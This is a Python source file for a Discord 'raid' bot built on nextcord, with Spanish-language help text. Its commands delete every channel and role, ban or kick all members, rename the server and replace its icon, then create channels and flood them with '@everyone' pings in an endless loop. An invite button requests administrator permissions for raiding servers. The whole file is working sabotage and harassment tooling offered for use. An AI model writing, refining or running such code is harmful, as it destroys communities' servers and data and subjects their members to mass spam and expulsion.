import nextcord
from nextcord.ext.commands.cooldowns import C
client = nextcord.Client()
from nextcord.ext import commands
from io import open
import json

intents = nextcord.Intents().all()

def information():
    info = open("variables.json", "r")
    json_info = json.load(info)
    return json_info 

dictionary_info = information()

bot = commands.Bot(command_prefix=dictionary_info["prefix"], description="asdasdasd", help_command=None, activity = nextcord.Game(name=f'{dictionary_info["prefix"]}help'), intents=intents)

#Commands

@bot.command()
async def spam(ctx):
    guild = ctx.message.guild
    channels = ctx.guild.channels
    while True:
        for channel in channels:
            try:
                await channel.send("@everyone")
            except Exception:
                print("Error")
                pass

@bot.command()
async def nuke(ctx):
    guild = ctx.message.guild
    channels = ctx.guild.channels
    channels_created = 0
    roles = ctx.guild.roles
    members = ctx.guild.members
    for channel in channels:
        try:
            existing_channel = nextcord.utils.get(guild.channels, id=channel.id)
            await existing_channel.delete()
        except Exception:
            pass
    for rol in roles:
        existing_rol = nextcord.utils.get(guild.roles, id=rol.id)
        try:
            await existing_rol.delete()
        except Exception:
            pass
    for member in members:
        existing_member = nextcord.utils.get(guild.members, id=member.id)
        try:
            await ctx.guild.kick(existing_member)
        except Exception:
            pass
    with open('raid.png', 'rb') as f:
        icon = f.read()
    await guild.edit(name=dictionary_info["server_name"], icon=icon)
    while channels_created != 20:
        await guild.create_text_channel(dictionary_info["channels_name"])
        channels_created += 1
    while True:
        channils = ctx.guild.channels
        for channil in channils:
            try:
                await channil.send("@everyone")
                await channil.send("@everyone")
            except Exception:
                print("Error")
                pass

@bot.command()
async def invite(ctx):
    embed = nextcord.Embed(title="🌎 Invitacion", description="Dale al boton para invitarme a un server pa' raidear", color=nextcord.Color.purple())
    await ctx.send(embed=embed, view=Buttons())

@bot.command()
async def killroles(ctx):
    guild = ctx.message.guild
    roles = ctx.guild.roles
    for rol in roles:
        existing_rol = nextcord.utils.get(guild.roles, id=rol.id)
        try:
            await existing_rol.delete()
        except Exception:
            pass

@bot.command()
async def killchannels(ctx):
    guild = ctx.message.guild
    channels = ctx.guild.channels
    for channel in channels:
        try:
            existing_channel = nextcord.utils.get(guild.channels, id=channel.id)
            print(existing_channel)
            await existing_channel.delete()
        except Exception:
            pass

@bot.command()
async def allban(ctx):
    guild = ctx.message.guild
    members = ctx.guild.members
    for member in members:
        existing_member = nextcord.utils.get(guild.members, id=member.id)
        print(existing_member)
        try:
            await ctx.guild.ban(existing_member)
        except Exception:
            pass

@bot.command()
async def allkick(ctx):
    guild = ctx.message.guild
    members = ctx.guild.members
    for member in members:
        existing_member = nextcord.utils.get(guild.members, id=member.id)
        print(existing_member)
        try:
            await ctx.guild.kick(existing_member)
        except Exception:
            pass

@bot.command()
async def help(ctx):
    if ctx.invoked_subcommand is None:
        prefix = dictionary_info["prefix"]
        embed = nextcord.Embed(title="**Comandos**", description=f'```El prefix del bot es "{prefix}", No me hago responsable de que tu server termine hecho mrda```', color=nextcord.Color.purple())
        embed.add_field(name="🚫 **``Allban``**", value="Banea a todos los miembros del servidor")
        embed.add_field(name="🚪 **``Allkick``**", value="Expulsa a todos los miembros del servidor")
        embed.add_field(name="🧹 **``Killchannels``**", value="Elimine todos los canales del servidor")
        embed.add_field(name="🚧️ **``Killroles``**", value="Elimine todos los roles del servidor")
        embed.add_field(name="☢️ **``Nuke``**", value="Manda a la mrda todo y destruye el servidor")
        embed.add_field(name="🌎 **``Invite``**", value="Link de invitacion para que me invites a raidear un server")
        embed.add_field(name="Enlaces del bot", value="• Codigo fuente del bot: https://github.com/Angelconejito/Tazita-Bot", inline=False)
        embed.set_image(url="https://cdn.discordapp.com/attachments/930247067564118067/966480738998435861/help_banner_tazita.png")
        await ctx.reply(embed=embed, mention_author=False)

# Events

class Buttons(nextcord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        supportServerButton = nextcord.ui.Button(label='Link de Invitacion', style=nextcord.ButtonStyle.gray, url=f'https://discord.com/api/oauth2/authorize?client_id={bot.user.id}&permissions=8&scope=bot')
        self.add_item(supportServerButton)
try:
    bot.run(dictionary_info["token"])
except Exception:
    print("No ha introducido un token, o el token que introducio no es valido")

@bot.event
async def on_ready():
    print("Ola")
